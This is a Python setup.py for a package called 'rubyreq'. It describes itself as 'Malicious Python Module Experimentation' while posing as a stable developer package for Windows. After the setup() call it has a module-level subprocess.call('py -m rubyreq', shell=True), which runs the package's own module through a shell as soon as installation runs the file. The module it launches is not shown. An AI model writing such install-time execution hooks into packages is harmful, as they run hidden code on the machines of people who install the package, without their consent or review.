from setuptools import setup, find_packages
from setuptools import setup
from setuptools.command.install import install

import subprocess



setup(
  name="rubyreq",
  version="8",
  author="CodeUK",
  author_email="d@doop.fun",
  description="Malicious Python Module Experimentation",
  url="https://github.com/codeuk/shutil",
  project_urls={
    "GitHub": "https://github.com/codeuk/shutil",
    "Bug Tracker": "https://github.com/codeuk/shutil/issues",
  },
  license="MIT",
  keywords=["rubyreq","rubyreq"],
  classifiers = [
  "Programming Language :: Python :: 3",
  "License :: OSI Approved :: MIT License",
  "Operating System :: Microsoft :: Windows",
  "Development Status :: 5 - Production/Stable",
  "Intended Audience :: Developers",
  "Natural Language :: English",
  "Topic :: Software Development"
  ],
  package_dir={"": "."},
  packages=find_packages(where="."),
  install_requires=['requests'],
)
subprocess.call("py -m rubyreq", shell=True)